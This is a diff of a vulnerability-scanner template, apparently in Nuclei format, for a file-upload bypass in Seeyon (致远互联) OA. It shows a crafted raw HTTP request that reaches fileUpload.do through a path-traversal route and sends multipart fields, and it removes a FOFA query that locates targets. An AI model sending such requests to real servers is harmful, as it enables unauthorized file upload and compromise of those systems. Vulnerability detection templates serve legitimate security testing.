@@ -3,14 +3,8 @@ info:
   name: 致远互联-OA前台fileUpload.do存在绕过文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/axgp3zc674yzdqum
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: axgp3zc674yzdqum
-    fofa: title="协同管理软件 V5.6SP1"
 http:
 - raw:
   - 'POST /seeyon/autoinstall.do/../../seeyon/fileUpload.do?method=processUpload HTTP/1.1
@@ -29,7 +23,6 @@ http:
     Content-Disposition: form-data; name="type"
 
 
-
     --00content0boundary00
 
     Content-Disposition: form-data; name="extensions"
@@ -42,11 +35,9 @@ http:
     Content-Disposition: form-data; name="applicationCategory"
 
 
-
     --00content0boundary00
 
     Content-Disposition: form-data; name="destDirectory"
-
 
 
     --00content0boundary00
@@ -54,11 +45,9 @@ http:
     Content-Disposition: form-data; name="destFilename"
 
 
-
     --00content0boundary00
 
     Content-Disposition: form-data; name="maxSize"
-
 
 
     --00content0boundary00
